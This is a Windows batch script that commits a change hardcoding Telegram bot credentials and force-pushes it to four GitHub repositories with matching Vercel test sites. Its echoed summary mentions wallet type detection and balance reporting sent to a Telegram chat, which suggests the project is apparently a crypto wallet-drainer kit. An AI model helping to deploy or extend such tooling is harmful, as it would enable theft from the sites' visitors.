@echo off
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo Checking if this is a git repository...
if not exist ".git" (
    echo ERROR: Not in a git repository!
    echo Please run this script from the Emi-lokan-main directory.
    pause
    exit /b 1
)
echo Git repository found!
echo.
echo Hardcoding Telegram configuration...
echo.
echo Changes made:
echo - Added hardcoded Telegram bot token as fallback
echo - Added hardcoded Telegram chat ID as fallback
echo - Telegram logging will now work even without environment variables
echo - Shows bot token and chat ID in console for verification
echo.
echo Committing hardcoded Telegram configuration...
git add .
git commit -m "HARDCODE: Telegram bot token and chat ID as fallback when env vars fail"
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing hardcoded Telegram config to all repositories...
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo Done! Hardcoded Telegram config pushed to all repositories.
echo.
echo Summary:
echo - Telegram logging now works without environment variables
echo - Hardcoded bot token and chat ID as fallback
echo - Wallet type detection should work correctly
echo - Balance reporting should work correctly
echo - All Telegram messages will be sent to the hardcoded chat
echo.
echo Test sites:
echo - MISUSE: https://misuse.vercel.app
echo - XENA: https://xena-brown.vercel.app
echo - Mambo: https://mambo-azure.vercel.app
echo.
echo Telegram logging should now work immediately!
pause
